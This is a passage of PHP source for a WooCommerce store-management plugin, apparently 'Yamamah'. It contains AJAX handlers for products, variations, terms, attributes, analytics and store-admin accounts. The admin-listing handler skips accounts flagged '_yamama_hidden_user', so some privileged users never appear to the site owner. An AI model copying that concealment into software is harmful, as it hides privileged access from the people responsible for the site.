            $attr = new WC_Product_Attribute();
            $attr->set_id( $attr_id );
            $attr->set_name( $taxonomy );
            $attr->set_options( $term_ids );
            $attr->set_position( $position );
            $attr->set_visible( ! empty( $ra['visible'] ) );
            $attr->set_variation( ! empty( $ra['variation'] ) );
            $wc_attrs[ sanitize_title( $taxonomy ) ] = $attr;
            $position++;
        }
        $product->set_attributes( $wc_attrs );
    } elseif ( array_key_exists( 'attributes', $_POST ) ) {
        // Explicit empty list clears attributes; omitted key leaves existing ones.
        $product->set_attributes( array() );
    }

    try {
        $store_type = yamamah_get_store_type();
        if ( in_array( $store_type, array( 'booking', 'rental' ), true ) ) {
            $dep_on = ! empty( $_POST['deposit_enabled'] ) && $_POST['deposit_enabled'] === '1';
            if ( $dep_on ) {
                $dep_type  = sanitize_text_field( $_POST['deposit_type'] ?? 'percentage' );
                $dep_check = yamamah_validate_deposit_value( $_POST['deposit_value'] ?? '', $dep_type );
                if ( ! $dep_check['valid'] ) {
                    wp_send_json_error( $dep_check['message'] );
                }
            }
        }

        $saved_id = $product->save();
    } catch ( \Exception $e ) {
        wp_send_json_error( $e->getMessage() );
    }

    if ( $type === 'variable' ) {
        $raw_vars = json_decode( stripslashes( $_POST['variations'] ?? '[]' ), true );
        if ( is_array( $raw_vars ) ) {
            $existing_var_ids = $product->get_children();
            $kept_ids = array();

            foreach ( $raw_vars as $rv ) {
                $vid = absint( $rv['id'] ?? 0 );
                if ( $vid ) {
                    $variation = wc_get_product( $vid );
                    if ( ! $variation || ! $variation->is_type( 'variation' ) ) {
                        $variation = new WC_Product_Variation();
                        $variation->set_parent_id( $saved_id );
                        $vid = 0;
                    }
                } else {
                    $variation = new WC_Product_Variation();
                    $variation->set_parent_id( $saved_id );
                }

                $var_attrs = array();
                if ( ! empty( $rv['attributes'] ) && is_array( $rv['attributes'] ) ) {
                    foreach ( $rv['attributes'] as $akey => $aval ) {
                        $taxonomy = sanitize_text_field( $akey );
                        $term_name = sanitize_text_field( $aval );
                        $term = get_term_by( 'name', $term_name, $taxonomy );
                        $var_attrs[ $taxonomy ] = $term ? $term->slug : sanitize_title( $term_name );
                    }
                }
                $variation->set_attributes( $var_attrs );
                $variation->set_regular_price( sanitize_text_field( $rv['regular_price'] ?? '' ) );
                $variation->set_sale_price( sanitize_text_field( $rv['sale_price'] ?? '' ) );
                $variation->set_sku( sanitize_text_field( $rv['sku'] ?? '' ) );

                $vstock = $rv['stock'] ?? '';
                if ( $vstock !== '' ) {
                    $variation->set_manage_stock( true );
                    $variation->set_stock_quantity( absint( $vstock ) );
                } else {
                    $variation->set_manage_stock( false );
                    $variation->set_stock_status( 'instock' );
                }

                $variation->set_status( 'publish' );
                $new_vid = $variation->save();
                $kept_ids[] = $new_vid;
            }

            foreach ( $existing_var_ids as $ev_id ) {
                if ( ! in_array( $ev_id, $kept_ids ) ) {
                    $old_v = wc_get_product( $ev_id );
                    if ( $old_v ) $old_v->delete( true );
                }
            }

            WC_Product_Variable::sync( $saved_id );
        }
    }

    // Booking / Rental per-product meta (only when client sends the fields — avoids wiping on partial mobile saves)
    if ( in_array( $store_type, array( 'booking', 'rental' ), true ) && array_key_exists( 'deposit_enabled', $_POST ) ) {
        $dep_on = ! empty( $_POST['deposit_enabled'] ) && (string) $_POST['deposit_enabled'] === '1';
        update_post_meta( $saved_id, '_deposit_enabled', $dep_on ? 'yes' : 'no' );
        if ( $dep_on ) {
            $dep_type  = sanitize_text_field( $_POST['deposit_type'] ?? 'percentage' );
            $dep_check = yamamah_validate_deposit_value( $_POST['deposit_value'] ?? '', $dep_type );
            update_post_meta( $saved_id, '_deposit_type', $dep_type );
            update_post_meta( $saved_id, '_deposit_value', $dep_check['value'] );
        } else {
            update_post_meta( $saved_id, '_deposit_type', sanitize_text_field( $_POST['deposit_type'] ?? 'percentage' ) );
            update_post_meta( $saved_id, '_deposit_value', 0 );
        }
    }

    if ( $store_type === 'rental' && array_key_exists( 'late_fee_enabled', $_POST ) ) {
        $lf_on = ! empty( $_POST['late_fee_enabled'] ) && (string) $_POST['late_fee_enabled'] === '1';
        update_post_meta( $saved_id, '_late_fee_enabled', $lf_on ? 'yes' : 'no' );
        update_post_meta( $saved_id, '_late_fee_type', sanitize_text_field( $_POST['late_fee_type'] ?? 'fixed' ) );
        update_post_meta( $saved_id, '_late_fee_value', floatval( $_POST['late_fee_value'] ?? 0 ) );

        $ins_on = ! empty( $_POST['insurance_enabled'] ) && (string) $_POST['insurance_enabled'] === '1';
        update_post_meta( $saved_id, '_insurance_enabled', $ins_on ? 'yes' : 'no' );
        update_post_meta( $saved_id, '_insurance_amount', floatval( $_POST['insurance_amount'] ?? 0 ) );
    }

    if ( yamamah_get_store_type() === 'booking' ) {
        yamamah_sync_workforce_product_image( $saved_id, $image_id );
    }

    // ضمان حفظ التصنيفات/الوسوم بعد الإنشاء (خصوصاً للمنتجات الجديدة).
    if ( $saved_id ) {
        wp_set_object_terms( $saved_id, $cat_ids, 'product_cat', false );
        wp_set_object_terms( $saved_id, $tag_ids, 'product_tag', false );
        clean_object_term_cache( $saved_id, 'product' );
        if ( function_exists( 'wc_delete_product_transients' ) ) {
            wc_delete_product_transients( $saved_id );
        }
    }

    wp_send_json_success( array( 'id' => $saved_id ) );
}

add_action( 'wp_ajax_yamamah_get_attribute_terms', 'yamamah_ajax_get_attribute_terms' );
function yamamah_ajax_get_attribute_terms() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    if ( ! $taxonomy ) wp_send_json_error( 'سمة غير صالحة' );

    if ( ! taxonomy_exists( $taxonomy ) ) {
        $attr_name = str_replace( 'pa_', '', $taxonomy );
        register_taxonomy( $taxonomy, 'product', array(
            'hierarchical' => false,
            'show_ui'      => false,
            'query_var'    => true,
            'rewrite'      => array( 'slug' => $attr_name ),
        ) );
    }

    $terms = get_terms( array( 'taxonomy' => $taxonomy, 'hide_empty' => false ) );
    if ( is_wp_error( $terms ) ) wp_send_json_error( $terms->get_error_message() );

    $data = array();
    foreach ( $terms as $t ) {
        $data[] = array( 'id' => $t->term_id, 'name' => $t->name, 'slug' => $t->slug );
    }
    wp_send_json_success( $data );
}

add_action( 'wp_ajax_yamamah_add_term', 'yamamah_ajax_add_term' );
function yamamah_ajax_add_term() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    $name     = sanitize_text_field( $_POST['name'] ?? '' );
    $slug     = sanitize_title( $_POST['slug'] ?? '' );
    $desc     = sanitize_textarea_field( $_POST['description'] ?? '' );
    $parent   = absint( $_POST['parent'] ?? 0 );

    if ( ! in_array( $taxonomy, array( 'product_cat', 'product_tag' ) ) || ! $name ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $args = array( 'slug' => $slug, 'description' => $desc );
    if ( $taxonomy === 'product_cat' ) $args['parent'] = $parent;

    $result = wp_insert_term( $name, $taxonomy, $args );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    if ( $taxonomy === 'product_cat' ) {
        $image_id = absint( $_POST['image_id'] ?? 0 );
        if ( $image_id ) {
            update_term_meta( $result['term_id'], 'thumbnail_id', $image_id );
        }
    }

    wp_send_json_success( array( 'term_id' => $result['term_id'] ) );
}

add_action( 'wp_ajax_yamamah_delete_term', 'yamamah_ajax_delete_term' );
function yamamah_ajax_delete_term() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    $term_id  = absint( $_POST['term_id'] ?? 0 );

    if ( ! in_array( $taxonomy, array( 'product_cat', 'product_tag' ) ) || ! $term_id ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $result = wp_delete_term( $term_id, $taxonomy );
    if ( is_wp_error( $result ) ) wp_send_json_error( $result->get_error_message() );

    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_update_term', 'yamamah_ajax_update_term' );
function yamamah_ajax_update_term() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( array( 'message' => 'غير مصرح' ) );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    $term_id  = absint( $_POST['term_id'] ?? 0 );
    $name     = sanitize_text_field( $_POST['name'] ?? '' );

    if ( ! in_array( $taxonomy, array( 'product_cat', 'product_tag' ), true ) || ! $term_id || ! $name ) {
        wp_send_json_error( array( 'message' => 'بيانات غير صالحة' ) );
    }

    $args = array( 'name' => $name );
    if ( isset( $_POST['slug'] ) && $_POST['slug'] !== '' ) {
        $args['slug'] = sanitize_title( $_POST['slug'] );
    }
    if ( isset( $_POST['parent'] ) ) {
        $args['parent'] = absint( $_POST['parent'] );
    }
    if ( isset( $_POST['description'] ) ) {
        $args['description'] = sanitize_textarea_field( $_POST['description'] );
    }

    $result = wp_update_term( $term_id, $taxonomy, $args );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    // Bug #103: تفريغ ذاكرة التخزين المؤقت للمنتجات حتى يظهر الاسم الجديد على كل المنتجات فوراً.
    yamamah_flush_term_product_caches( $term_id, $taxonomy );

    wp_send_json_success();
}

/**
 * Bug #103: تفريغ ذاكرة التخزين المؤقت للمنتجات المرتبطة بمصطلح (تصنيف/وسم/سمة)
 * بعد إعادة تسميته، لضمان اتساق العرض على واجهة المتجر.
 *
 * @param int    $term_id  معرف المصطلح.
 * @param string $taxonomy التصنيف.
 * @return void
 */
function yamamah_flush_term_product_caches( $term_id, $taxonomy ) {
    $term_id = absint( $term_id );
    if ( $term_id ) {
        clean_term_cache( $term_id, $taxonomy );

        // تفريغ ذاكرة المنتجات التي تستخدم هذا المصطلح.
        $product_ids = get_posts(
            array(
                'post_type'      => 'product',
                'post_status'    => 'any',
                'fields'         => 'ids',
                'posts_per_page' => -1,
                'no_found_rows'  => true,
                'tax_query'      => array( // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_tax_query
                    array(
                        'taxonomy'         => $taxonomy,
                        'field'            => 'term_id',
                        'terms'            => array( $term_id ),
                        'include_children' => true,
                    ),
                ),
            )
        );
        if ( function_exists( 'wc_delete_product_transients' ) && ! empty( $product_ids ) ) {
            foreach ( $product_ids as $pid ) {
                wc_delete_product_transients( $pid );
            }
        }
    }

    delete_transient( 'wc_attribute_taxonomies' );
    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
}

/**
 * Sanitize product attribute type against registered WC types.
 *
 * @param string $type Raw type.
 * @return string
 */
function yamamah_sanitize_attribute_type( $type ) {
    $type  = sanitize_text_field( (string) $type );
    $types = function_exists( 'wc_get_attribute_types' ) ? wc_get_attribute_types() : array( 'select' => 'select' );
    if ( $type && isset( $types[ $type ] ) ) {
        return $type;
    }
    return 'select';
}

add_action( 'wp_ajax_yamamah_save_attribute', 'yamamah_ajax_save_attribute' );
function yamamah_ajax_save_attribute() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $args = array(
        'name'         => sanitize_text_field( $_POST['name'] ?? '' ),
        'slug'         => sanitize_title( $_POST['slug'] ?? '' ),
        'type'         => yamamah_sanitize_attribute_type( $_POST['type'] ?? 'select' ),
        'order_by'     => sanitize_text_field( $_POST['order_by'] ?? 'menu_order' ),
        'has_archives' => ! empty( $_POST['archive'] ),
    );

    if ( ! $args['name'] ) {
        wp_send_json_error( 'الاسم مطلوب' );
    }

    $result = wc_create_attribute( $args );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    // Flush attribute cache so type is visible immediately.
    delete_transient( 'wc_attribute_taxonomies' );
    wp_send_json_success( array( 'id' => $result, 'type' => $args['type'] ) );
}

add_action( 'wp_ajax_yamamah_update_attribute', 'yamamah_ajax_update_attribute' );
function yamamah_ajax_update_attribute() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $attr_id = absint( $_POST['attribute_id'] ?? 0 );
    if ( ! $attr_id ) {
        wp_send_json_error( 'معرف السمة غير صالح' );
    }

    $args = array(
        'name'         => sanitize_text_field( $_POST['name'] ?? '' ),
        'slug'         => sanitize_title( $_POST['slug'] ?? '' ),
        'type'         => yamamah_sanitize_attribute_type( $_POST['type'] ?? 'select' ),
        'order_by'     => sanitize_text_field( $_POST['order_by'] ?? 'menu_order' ),
        'has_archives' => ! empty( $_POST['archive'] ),
    );

    if ( ! $args['name'] ) {
        wp_send_json_error( 'الاسم مطلوب' );
    }

    $result = wc_update_attribute( $attr_id, $args );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    // Bug #103: تفريغ ذاكرة المنتجات حتى يظهر اسم السمة الجديد على كل المنتجات.
    delete_transient( 'wc_attribute_taxonomies' );
    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
    wp_send_json_success( array( 'type' => $args['type'] ) );
}

add_action( 'wp_ajax_yamamah_delete_attribute', 'yamamah_ajax_delete_attribute' );
function yamamah_ajax_delete_attribute() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $attr_id = absint( $_POST['attribute_id'] ?? 0 );
    if ( ! $attr_id ) wp_send_json_error( 'معرف السمة غير صالح' );

    $result = wc_delete_attribute( $attr_id );
    if ( ! $result ) wp_send_json_error( 'فشل حذف السمة' );

    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_add_attr_value', 'yamamah_ajax_add_attr_value' );
function yamamah_ajax_add_attr_value() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    $name     = sanitize_text_field( $_POST['name'] ?? '' );
    if ( ! $taxonomy || ! $name ) wp_send_json_error( 'بيانات غير صالحة' );

    if ( ! taxonomy_exists( $taxonomy ) ) {
        $attr_name = str_replace( 'pa_', '', $taxonomy );
        $attr = wc_get_attribute( wc_attribute_taxonomy_id_by_name( $attr_name ) );
        if ( ! $attr ) wp_send_json_error( 'السمة غير موجودة' );
        register_taxonomy( $taxonomy, 'product', array() );
    }

    $result = wp_insert_term( $name, $taxonomy );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( $result->get_error_message() );
    }

    $term = get_term( $result['term_id'], $taxonomy );

    // Bug #103: تفريغ ذاكرة المنتجات عند إضافة قيمة سمة.
    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
    wp_send_json_success( array( 'term_id' => $result['term_id'], 'name' => $term->name, 'slug' => $term->slug ) );
}

add_action( 'wp_ajax_yamamah_delete_attr_value', 'yamamah_ajax_delete_attr_value' );
function yamamah_ajax_delete_attr_value() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $taxonomy = sanitize_text_field( $_POST['taxonomy'] ?? '' );
    $term_id  = absint( $_POST['term_id'] ?? 0 );
    if ( ! $taxonomy || ! $term_id ) wp_send_json_error( 'بيانات غير صالحة' );

    $result = wp_delete_term( $term_id, $taxonomy );
    if ( is_wp_error( $result ) ) wp_send_json_error( $result->get_error_message() );

    // Bug #103: تفريغ ذاكرة المنتجات عند حذف قيمة سمة.
    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
    wp_send_json_success();
}

/* =========================================
 * AJAX — Analytics Settings & Chart Data
 * ======================================== */

add_action( 'wp_ajax_yamamah_save_analytics_settings', 'yamamah_ajax_save_analytics_settings' );
function yamamah_ajax_save_analytics_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $excluded   = isset( $_POST['excluded'] )   && is_array( $_POST['excluded'] )   ? array_map( 'sanitize_text_field', $_POST['excluded'] )   : array();
    $actionable = isset( $_POST['actionable'] ) && is_array( $_POST['actionable'] ) ? array_map( 'sanitize_text_field', $_POST['actionable'] ) : array();
    $date_range = sanitize_text_field( $_POST['date_range'] ?? 'month_to_date' );
    $date_type  = sanitize_text_field( $_POST['date_type']  ?? 'date_created' );

    update_option( 'yamamah_analytics_excluded',   $excluded );
    update_option( 'yamamah_analytics_actionable', $actionable );
    update_option( 'yamamah_analytics_date_range', $date_range );
    update_option( 'yamamah_analytics_date_type',  $date_type );

    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_get_chart_data', 'yamamah_ajax_get_chart_data' );
function yamamah_ajax_get_chart_data() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $chart_type = sanitize_text_field( $_POST['chart_type'] ?? 'revenue' );
    $period     = sanitize_text_field( $_POST['period'] ?? 'months' );
    if ( ! in_array( $period, array( 'days', 'weeks', 'months' ), true ) ) {
        $period = 'months';
    }

    try {
        $api = new Yamamah_API();

        if ( $chart_type === 'products' ) {
            $raw = $api->get_orders_chart_data( $period );
            wp_send_json_success(
                array(
                    'labels'    => wp_list_pluck( $raw, 'label' ),
                    'orders'    => wp_list_pluck( $raw, 'orders' ),
                    'cancelled' => wp_list_pluck( $raw, 'cancelled' ),
                    'period'    => $period,
                )
            );
        }

        $raw = $api->get_sales_chart_data( $period );
        wp_send_json_success(
            array(
                'labels' => wp_list_pluck( $raw, 'label' ),
                'values' => wp_list_pluck( $raw, 'sales' ),
                'period' => $period,
            )
        );
    } catch ( \Throwable $e ) {
        wp_send_json_error( array( 'message' => 'خطأ في تحميل بيانات الرسم البياني: ' . $e->getMessage() ) );
    }
}

add_action( 'wp_ajax_yamamah_get_analytics_revenue', 'yamamah_ajax_get_analytics_revenue' );
function yamamah_ajax_get_analytics_revenue() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    $period = sanitize_text_field( $_REQUEST['period'] ?? '30day' );
    try {
        $api = new Yamamah_API();
        wp_send_json_success(
            array(
                'revenue' => $api->get_revenue_analytics_full( $period ),
                'chart'   => $api->get_monthly_sales_chart_data(),
                'period'  => $period,
            )
        );
    } catch ( \Throwable $e ) {
        wp_send_json_error( array( 'message' => 'خطأ في تحميل بيانات الإيرادات: ' . $e->getMessage() ) );
    }
}

add_action( 'wp_ajax_yamamah_get_analytics_products', 'yamamah_ajax_get_analytics_products' );
function yamamah_ajax_get_analytics_products() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    $period = sanitize_text_field( $_REQUEST['period'] ?? '30day' );
    try {
        $api    = new Yamamah_API();
        $labels = function_exists( 'yamamah_get_catalog_labels' ) ? yamamah_get_catalog_labels() : array();
        wp_send_json_success(
            array(
                'products' => $api->get_products_analytics_data( $period ),
                'chart'    => $api->get_monthly_orders_chart_data(),
                'period'   => $period,
                'title'    => $labels['analytics_title'] ?? 'المنتجات',
                'subtitle' => $labels['analytics_subtitle'] ?? 'ملخص شامل لأداء المنتجات',
            )
        );
    } catch ( \Throwable $e ) {
        wp_send_json_error( array( 'message' => 'خطأ في تحميل بيانات المنتجات: ' . $e->getMessage() ) );
    }
}

add_action( 'wp_ajax_yamamah_get_analytics_settings', 'yamamah_ajax_get_analytics_settings' );
function yamamah_ajax_get_analytics_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    wp_send_json_success(
        array(
            'excluded'   => get_option( 'yamamah_analytics_excluded', array( 'pending', 'cancelled', 'failed' ) ),
            'actionable' => get_option( 'yamamah_analytics_actionable', array( 'processing', 'on-hold' ) ),
            'date_range' => get_option( 'yamamah_analytics_date_range', 'month_to_date' ),
            'date_type'  => get_option( 'yamamah_analytics_date_type', 'date_created' ),
        )
    );
}

/* =========================================
 * AJAX — Admin Management (Create / Edit / Delete)
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_admin', 'yamamah_ajax_save_admin' );
function yamamah_ajax_save_admin() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $edit_id  = intval( $_POST['edit_id'] ?? 0 );
    $name     = sanitize_text_field( $_POST['name'] ?? '' );
    $email    = sanitize_email( $_POST['email'] ?? '' );
    $phone    = sanitize_text_field( $_POST['phone'] ?? '' );
    $password = $_POST['password'] ?? '';
    $role     = sanitize_text_field( $_POST['role'] ?? 'editor' );
    $perms    = isset( $_POST['perms'] ) && is_array( $_POST['perms'] ) ? array_map( 'sanitize_text_field', $_POST['perms'] ) : array();

    $allowed_roles = array( 'administrator', 'shop_manager', 'editor', 'shipping_manager', 'support', 'custom' );
    if ( ! in_array( $role, $allowed_roles, true ) ) {
        $role = 'editor';
    }

    $wp_role = in_array( $role, array( 'administrator', 'shop_manager', 'editor' ), true ) ? $role : 'editor';

    if ( empty( $perms ) && function_exists( 'yamamah_role_default_perms' ) ) {
        $perms = yamamah_role_default_perms( $role );
    }

    if ( $edit_id ) {
        $user = get_userdata( $edit_id );
        if ( ! $user ) {
            wp_send_json_error( array( 'message' => 'المستخدم غير موجود.' ) );
        }
        $update_data = array( 'ID' => $edit_id, 'display_name' => $name, 'user_email' => $email );
        if ( ! empty( $password ) ) {
            $update_data['user_pass'] = $password;
        }
        $result = wp_update_user( $update_data );
        if ( is_wp_error( $result ) ) {
            wp_send_json_error( array( 'message' => $result->get_error_message() ) );
        }
        $user->set_role( $wp_role );
        $user->add_cap( 'manage_woocommerce' );
        update_user_meta( $edit_id, 'yamamah_permissions', $perms );
        update_user_meta( $edit_id, 'yamamah_role', $role );
        if ( $phone ) update_user_meta( $edit_id, 'yamamah_phone', $phone );
        wp_send_json_success( array( 'message' => 'تم تحديث المدير بنجاح.' ) );
    } else {
        if ( empty( $name ) || empty( $email ) || empty( $password ) ) {
            wp_send_json_error( array( 'message' => 'الاسم والبريد وكلمة المرور مطلوبة.' ) );
        }

        if ( function_exists( 'yamamah_plan_feature' ) ) {
            $max_admins = (int) yamamah_plan_feature( 'max_admins', 2 );
            $from_opt = get_option( 'yamama_max_admins', '' );
            if ( $from_opt !== '' && is_numeric( $from_opt ) ) {
                $max_admins = (int) $from_opt;
            }
            $admin_roles = array( 'administrator', 'shop_manager', 'editor' );
            $current_admins = 0;
            foreach ( $admin_roles as $ar ) {
                $users = get_users( array( 'role' => $ar, 'fields' => 'ID' ) );
                $current_admins += count( $users );
            }
            $yam_admins = get_users( array( 'meta_key' => 'yamamah_role', 'fields' => 'ID' ) );
            $current_admins = max( $current_admins, count( $yam_admins ) );
            if ( $current_admins >= $max_admins ) {
                wp_send_json_error( array( 'message' => sprintf( 'وصلت للحد الأقصى من المدراء (%d). قم بترقية باقتك لإضافة المزيد.', $max_admins ) ) );
            }
        }

        $username = sanitize_user( strtolower( str_replace( ' ', '_', $name ) ) . '_' . wp_rand( 100, 999 ) );
        $user_id = wp_create_user( $username, $password, $email );
        if ( is_wp_error( $user_id ) ) {
            wp_send_json_error( array( 'message' => $user_id->get_error_message() ) );
        }
        wp_update_user( array( 'ID' => $user_id, 'display_name' => $name ) );
        $new_user = new WP_User( $user_id );
        $new_user->set_role( $wp_role );
        $new_user->add_cap( 'manage_woocommerce' );
        update_user_meta( $user_id, 'yamamah_permissions', $perms );
        update_user_meta( $user_id, 'yamamah_role', $role );
        if ( $phone ) update_user_meta( $user_id, 'yamamah_phone', $phone );
        wp_send_json_success( array( 'message' => 'تم إنشاء المدير بنجاح.' ) );
    }
}

add_action( 'wp_ajax_yamamah_delete_admin', 'yamamah_ajax_delete_admin' );
function yamamah_ajax_delete_admin() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $user_id = intval( $_POST['user_id'] ?? 0 );
    if ( ! $user_id || $user_id === get_current_user_id() ) {
        wp_send_json_error( array( 'message' => 'لا يمكن حذف هذا المستخدم.' ) );
    }

    require_once ABSPATH . 'wp-admin/includes/user.php';
    $result = wp_delete_user( $user_id );
    if ( $result ) {
        wp_send_json_success( array( 'message' => 'تم حذف المدير بنجاح.' ) );
    } else {
        wp_send_json_error( array( 'message' => 'فشل حذف المدير.' ) );
    }
}

add_action( 'wp_ajax_yamamah_get_admin', 'yamamah_ajax_get_admin' );
function yamamah_ajax_get_admin() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $user_id = intval( $_POST['user_id'] ?? 0 );
    $user    = get_userdata( $user_id );
    if ( ! $user ) {
        wp_send_json_error( array( 'message' => 'المستخدم غير موجود.' ) );
    }

    $perms = get_user_meta( $user_id, 'yamamah_permissions', true );
    if ( ! is_array( $perms ) ) $perms = array();

    $yamamah_role = get_user_meta( $user_id, 'yamamah_role', true );
    if ( empty( $yamamah_role ) ) {
        $yamamah_role = ! empty( $user->roles ) ? $user->roles[0] : 'editor';
    }

    wp_send_json_success( array(
        'id'       => $user->ID,
        'name'     => $user->display_name,
        'email'    => $user->user_email,
        'phone'    => get_user_meta( $user_id, 'yamamah_phone', true ) ?: '',
        'role'     => $yamamah_role,
        'perms'    => $perms,
    ));
}

add_action( 'wp_ajax_yamamah_get_admins', 'yamamah_ajax_get_admins' );
function yamamah_ajax_get_admins() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $role_labels = array(
        'administrator'    => 'مدير عام',
        'shop_manager'     => 'مدير',
        'editor'           => 'محرر',
        'shipping_manager' => 'مدير شحن',
        'support'          => 'دعم فني',
        'custom'           => 'مخصص',
    );

    $all_admins = get_users(
        array(
            'role__in' => array( 'administrator', 'shop_manager', 'editor' ),
            'orderby'  => 'registered',
            'order'    => 'DESC',
        )
    );

    $rows = array();
    foreach ( $all_admins as $admin ) {
        if ( get_user_meta( $admin->ID, '_yamama_hidden_user', true ) ) {
            continue;
        }
        $yam_role = get_user_meta( $admin->ID, 'yamamah_role', true );
        $role     = ! empty( $yam_role ) ? $yam_role : ( ! empty( $admin->roles ) ? $admin->roles[0] : 'editor' );
        $perms    = get_user_meta( $admin->ID, 'yamamah_permissions', true );
        if ( ! is_array( $perms ) ) {
            $perms = array();
        }
        $rows[] = array(
            'id'         => $admin->ID,
            'name'       => $admin->display_name,
            'email'      => $admin->user_email,
            'phone'      => get_user_meta( $admin->ID, 'yamamah_phone', true ) ?: '',
            'role'       => $role,
            'role_label' => isset( $role_labels[ $role ] ) ? $role_labels[ $role ] : $role,
            'last_login' => get_user_meta( $admin->ID, 'last_login', true ) ?: '',
            'perms'      => $perms,
            'perm_count' => count( $perms ),
        );
    }

    wp_send_json_success( array( 'admins' => $rows ) );
}

/* =========================================
 * AJAX — Site Colors (Content Management)
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_site_colors', 'yamamah_ajax_save_site_colors' );
function yamamah_ajax_save_site_colors() {
    $nonce_ok = check_ajax_referer( 'yamamah_nonce', 'nonce', false )
        || check_ajax_referer( 'yamamah_nonce', '_wpnonce', false );
    if ( ! $nonce_ok ) {
        wp_send_json_error( array( 'message' => 'فشل التحقق الأمني.' ) );
    }
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $manifest = apply_filters( 'ydash_theme_manifest', array() );
    $allowed  = isset( $manifest['color_fields'] ) ? array_keys( $manifest['color_fields'] ) : array( 'button_primary', 'header_background', 'footer_background', 'product_card_bg' );
    $raw      = isset( $_POST['colors'] ) && is_array( $_POST['colors'] ) ? $_POST['colors'] : $_POST;
    $colors   = array();
    foreach ( $allowed as $key ) {
        $val = sanitize_text_field( $raw[ $key ] ?? '' );
        if ( preg_match( '/^#[0-9A-Fa-f]{6}$/', $val ) ) {
            $colors[ $key ] = $val;
        }
    }
    do_action( 'ydash_save_color_settings', $colors );
    wp_send_json_success();
}

/* =========================================
 * AJAX — Reviews (Content Management)
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_review', 'yamamah_ajax_save_review' );
function yamamah_ajax_save_review() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $reviews = apply_filters( 'ydash_get_reviews', array() );
    if ( ! is_array( $reviews ) ) {
        $reviews = array();
    }

